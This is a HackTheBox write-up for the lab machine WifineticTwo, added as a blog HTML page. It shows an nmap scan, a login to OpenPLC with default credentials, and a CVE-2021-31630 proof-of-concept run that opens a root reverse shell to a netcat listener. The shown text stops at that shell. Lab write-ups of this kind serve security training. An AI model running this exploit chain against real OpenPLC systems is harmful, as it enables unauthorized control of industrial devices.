@@ -1,0 +1,824 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://foued-saidi.tech/2024/07/27/hackthebox-wifinetictwo/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="Overview WifineticTwo is an easy-difficulty machine from HackTheBox that provides the opportunity to exploit a vulnerable version OpenPLC server, scan a wireless network, exploit the AP to get the rou">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox: WifineticTwo">
+<meta property="og:url" content="http://foued-saidi.tech/2024/07/27/HackTheBox-WifineticTwo/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="Overview WifineticTwo is an easy-difficulty machine from HackTheBox that provides the opportunity to exploit a vulnerable version OpenPLC server, scan a wireless network, exploit the AP to get the rou">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/WifineticTwo/WifineticTwo.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/WifineticTwo/web-app-8080.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/WifineticTwo/openplc-default-creds.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/WifineticTwo/openplc-login.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/WifineticTwo/CVE-2021-31630.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/WifineticTwo/OPENWRT.png">
+<meta property="article:published_time" content="2024-07-27T17:21:16.000Z">
+<meta property="article:modified_time" content="2024-07-27T17:25:58.347Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/WifineticTwo/WifineticTwo.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            HackTheBox: WifineticTwo -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"foued-saidi.tech","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":["Through Pixels and Code","Our Cyber Stories Unfold.","SecuriNets for life"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">HackTheBox: WifineticTwo</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-07-27 18:21:16</span>
+        <span class="mobile">2024-07-27 18:21:16</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-07-27 18:25:58</span>
+            <span class="mobile">2024-07-27 18:25:58</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p> WifineticTwo is an easy-difficulty machine from HackTheBox that provides the opportunity to exploit a vulnerable version OpenPLC server, scan a wireless network, exploit the AP to get the router password, connect to it and then pivot onto the Open-WRT Access Point.<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/WifineticTwo/WifineticTwo.png"
+                      alt="Headles-info-card"
+                ><figcaption>Headles-info-card</figcaption></figure></p>
+<h3 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h3><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nmap <span class="literal">-A</span> <span class="literal">-Pn</span> <span class="number">10.129</span>.<span class="number">75.3</span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2024</span><span class="literal">-07-27</span> <span class="number">11</span>:<span class="number">58</span> W. Central Africa Standard Time</span><br><span class="line">NSOCK ERROR <span class="function">[<span class="number">0.2470</span><span class="type">s</span>] <span class="title">ssl_init_helper</span></span>(): OpenSSL legacy provider failed to load.</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.129</span>.<span class="number">75.3</span></span><br><span class="line">Host is up (<span class="number">0.42</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line"><span class="number">22</span>/tcp   open  ssh        OpenSSH <span class="number">8.2</span>p1 Ubuntu <span class="number">4</span>ubuntu0.<span class="number">11</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>:</span><br><span class="line">|   <span class="number">3072</span> <span class="number">48</span>add5b83a9fbcbef7e8201ef6bfdeae (RSA)</span><br><span class="line">|   <span class="number">256</span> b7896c0b20ed49b2c1867c2992741c1f (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">18</span>cd9d08a621a8b8b6f79f8d405154fb (ED25519)</span><br><span class="line"><span class="number">8080</span>/tcp open  http<span class="literal">-proxy</span> Werkzeug/<span class="number">1.0</span>.<span class="number">1</span> Python/<span class="number">2.7</span>.<span class="number">18</span></span><br><span class="line">| fingerprint<span class="literal">-strings</span>:</span><br><span class="line">|   FourOhFourRequest:</span><br><span class="line">|     HTTP/<span class="number">1.0</span> <span class="number">404</span> NOT FOUND</span><br><span class="line">|     content<span class="literal">-type</span>: text/html; charset=utf<span class="literal">-8</span></span><br><span class="line">|     content<span class="literal">-length</span>: <span class="number">232</span></span><br><span class="line">|     vary: Cookie</span><br><span class="line">|     <span class="built_in">set-cookie</span>: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.ZqTTNQ.et7qGhPoRm1vSFs8pnh_t4_XhIs; Expires=Sat, <span class="number">27</span><span class="literal">-Jul-2024</span> <span class="number">11</span>:<span class="number">05</span>:<span class="number">05</span> GMT; HttpOnly; Path=/</span><br><span class="line">|     server: Werkzeug/<span class="number">1.0</span>.<span class="number">1</span> Python/<span class="number">2.7</span>.<span class="number">18</span></span><br><span class="line">|     date: Sat, <span class="number">27</span> Jul <span class="number">2024</span> <span class="number">11</span>:<span class="number">00</span>:<span class="number">05</span> GMT</span><br><span class="line">|     &lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//W3C//DTD HTML 3.2 Final//EN&quot;</span>&gt;</span><br><span class="line">|     &lt;title&gt;<span class="number">404</span> Not Found&lt;/title&gt;</span><br><span class="line">|     &lt;h1&gt;Not Found&lt;/h1&gt;</span><br><span class="line">|     &lt;p&gt;The requested URL was not found on the server. <span class="keyword">If</span> you entered the URL manually please check your spelling and <span class="keyword">try</span> again.&lt;/p&gt;</span><br><span class="line">|   GetRequest:</span><br><span class="line">|     HTTP/<span class="number">1.0</span> <span class="number">302</span> FOUND</span><br><span class="line">|     content<span class="literal">-type</span>: text/html; charset=utf<span class="literal">-8</span></span><br><span class="line">|     content<span class="literal">-length</span>: <span class="number">219</span></span><br><span class="line">|     location: http://<span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">8080</span>/login</span><br><span class="line">|     vary: Cookie</span><br><span class="line">|     <span class="built_in">set-cookie</span>: session=eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ.ZqTTMA.ZUdselS7Zc1Tv<span class="literal">-oYIMJLOe-2JJs</span>; Expires=Sat, <span class="number">27</span><span class="literal">-Jul-2024</span> <span class="number">11</span>:<span class="number">05</span>:<span class="number">00</span> GMT; HttpOnly; Path=/</span><br><span class="line">|     server: Werkzeug/<span class="number">1.0</span>.<span class="number">1</span> Python/<span class="number">2.7</span>.<span class="number">18</span></span><br><span class="line">|     date: Sat, <span class="number">27</span> Jul <span class="number">2024</span> <span class="number">11</span>:<span class="number">00</span>:<span class="number">00</span> GMT</span><br><span class="line">|     &lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//W3C//DTD HTML 3.2 Final//EN&quot;</span>&gt;</span><br><span class="line">|     &lt;title&gt;Redirecting...&lt;/title&gt;</span><br><span class="line">|     &lt;h1&gt;Redirecting...&lt;/h1&gt;</span><br><span class="line">|     &lt;p&gt;You should be redirected automatically to target URL: &lt;a href=<span class="string">&quot;/login&quot;</span>&gt;/login&lt;/a&gt;. <span class="keyword">If</span> not click the link.</span><br><span class="line">|   HTTPOptions:</span><br><span class="line">|     HTTP/<span class="number">1.0</span> <span class="number">200</span> OK</span><br><span class="line">|     content<span class="literal">-type</span>: text/html; charset=utf<span class="literal">-8</span></span><br><span class="line">|     allow: HEAD, OPTIONS, GET</span><br><span class="line">|     vary: Cookie</span><br><span class="line">|     <span class="built_in">set-cookie</span>: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.ZqTTMg.gxlsN0lxodwWIFcly8yD_bLvBgQ; Expires=Sat, <span class="number">27</span><span class="literal">-Jul-2024</span> <span class="number">11</span>:<span class="number">05</span>:<span class="number">02</span> GMT; HttpOnly; Path=/</span><br><span class="line">|     content<span class="literal">-length</span>: <span class="number">0</span></span><br><span class="line">|     server: Werkzeug/<span class="number">1.0</span>.<span class="number">1</span> Python/<span class="number">2.7</span>.<span class="number">18</span></span><br><span class="line">|     date: Sat, <span class="number">27</span> Jul <span class="number">2024</span> <span class="number">11</span>:<span class="number">00</span>:<span class="number">02</span> GMT</span><br><span class="line">|   RTSPRequest:</span><br><span class="line">|     HTTP/<span class="number">1.1</span> <span class="number">400</span> Bad request</span><br><span class="line">|     content<span class="literal">-length</span>: <span class="number">90</span></span><br><span class="line">|     cache<span class="literal">-control</span>: no<span class="literal">-cache</span></span><br><span class="line">|     content<span class="literal">-type</span>: text/html</span><br><span class="line">|     connection: close</span><br><span class="line">|     &lt;html&gt;&lt;body&gt;&lt;h1&gt;<span class="number">400</span> Bad request&lt;/h1&gt;</span><br><span class="line">|     Your browser sent an invalid request.</span><br><span class="line">|_    &lt;/body&gt;&lt;/html&gt;</span><br><span class="line">| http<span class="literal">-title</span>: Site doesn<span class="string">&#x27;t have a title (text/html; charset=utf-8).</span></span><br><span class="line"><span class="string">|_Requested resource was http://10.129.75.3:8080/login</span></span><br><span class="line"><span class="string">|_http-server-header: Werkzeug/1.0.1 Python/2.7.18</span></span><br><span class="line"><span class="string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span></span><br><span class="line"><span class="string">&lt;snip&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>We can see that we have OpenSSH running on port 22, and what seems to be a Python web app on port 8080.</p>
+<h3 id="Web-application-10-129-75-3-8080"><a href="#Web-application-10-129-75-3-8080" class="headerlink" title="Web application - 10.129.75.3:8080"></a>Web application - 10.129.75.3:8080</h3><p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/WifineticTwo/web-app-8080.png"
+                      alt="Web App Port 8080"
+                ><figcaption>Web App Port 8080</figcaption></figure></p>
+<p>This is OpenPLC, an open-source Programmable Logic Controller that is based on an easy to use software.<br>I instantly went over to google and searched for defaul credentials for OpenPLC:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/WifineticTwo/openplc-default-creds.png"
+                      alt="OpenPLC  default credentials"
+                ><figcaption>OpenPLC  default credentials</figcaption></figure></p>
+<p>Let’s try to login with those credentials:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/WifineticTwo/openplc-login.png"
+                      alt="OpenPLC login"
+                ><figcaption>OpenPLC login</figcaption></figure></p>
+<p>And we are in!!<br>But before I go on and check for any interesting thing on the portal after logging in, I go ahead and check for any Vulnerabilities or CVEs for OpenPLC.<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/WifineticTwo/CVE-2021-31630.png"
+                      alt="OpenPLC CVE"
+                ><figcaption>OpenPLC CVE</figcaption></figure></p>
+<h4 id="CVE-2021-31630"><a href="#CVE-2021-31630" class="headerlink" title="CVE-2021-31630"></a>CVE-2021-31630</h4><p>I found <a class="link"   target="_blank" rel="noopener" href="https://github.com/thewhiteh4t/cve-2021-31630" >this github repo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> with a Proof-of-concept for <a class="link"   target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2021-31630" >CVE-2021-31630 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, which is a Command Injection vulnerability in Open PLC Webserver v3 that allows remote attackers to execute arbitrary code via the “Hardware Layer Code Box” component on the “&#x2F;hardware” page of the application.<br>Let’s clone the repo and exploit this vulnerbaility, it is pretty straight forward by specifying the OpenPLC default credentials:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; python3 .\exploit.py <span class="literal">-lh</span> <span class="number">10.10</span>.x.x <span class="literal">-lp</span> <span class="number">9001</span> http://<span class="number">10.129</span>.<span class="number">75.3</span>:<span class="number">8080</span></span><br><span class="line"></span><br><span class="line"><span class="literal">------------------------------------------------</span></span><br><span class="line"><span class="literal">---</span> CVE<span class="literal">-2021-31630</span> <span class="literal">-----------------------------</span></span><br><span class="line"><span class="literal">---</span> OpenPLC WebServer v3 - Authenticated RCE <span class="literal">---</span></span><br><span class="line"><span class="literal">------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">[&gt;] Found By : Fellipe Oliveira</span><br><span class="line">[&gt;] PoC By   : thewhiteh4t [ <span class="type">https</span>://<span class="type">twitter.com</span>/<span class="type">thewhiteh4t</span> ]</span><br><span class="line"></span><br><span class="line">[&gt;] Target   : http://<span class="number">10.129</span>.<span class="number">75.3</span>:<span class="number">8080</span></span><br><span class="line">[&gt;] Username : openplc</span><br><span class="line">[&gt;] Password : openplc</span><br><span class="line">[&gt;] Timeout  : <span class="number">20</span> secs</span><br><span class="line">[&gt;] LHOST    : <span class="number">10.10</span>.x.x</span><br><span class="line">[&gt;] LPORT    : <span class="number">9001</span></span><br><span class="line"></span><br><span class="line">[!] Checking status...</span><br><span class="line">[+] Service is Online!</span><br><span class="line">[!] Logging <span class="keyword">in</span>...</span><br><span class="line">[+] Logged <span class="keyword">in</span>!</span><br><span class="line">[!] Restoring default program...</span><br><span class="line">[+] PLC Stopped!</span><br><span class="line">[+] Cleanup successful!</span><br><span class="line">[!] Uploading payload...</span><br><span class="line">[+] Payload uploaded!</span><br><span class="line">[+] Waiting <span class="keyword">for</span> <span class="number">5</span> seconds...</span><br><span class="line">[+] Compilation successful!</span><br><span class="line">[!] Starting PLC...</span><br><span class="line">[+] PLC Started! Check listener...</span><br><span class="line">[!] Cleaning up...</span><br><span class="line">[+] PLC Stopped!</span><br><span class="line">[+] Cleanup successful!</span><br></pre></td></tr></table></figure></div>
+<p>And we get a callback on our listener:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nc <span class="literal">-lvnp</span> <span class="number">9001</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">9001</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">10.10</span><span class="type">.x.x</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">10.129</span><span class="type">.75.3</span>] <span class="number">44484</span></span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal <span class="keyword">process</span> <span class="built_in">group</span> (<span class="number">171</span>): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@attica02:/opt/PLC/OpenPLC_v3/webserver<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br><span class="line">root@attica02:/opt/PLC/OpenPLC_v3/webserver<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
+
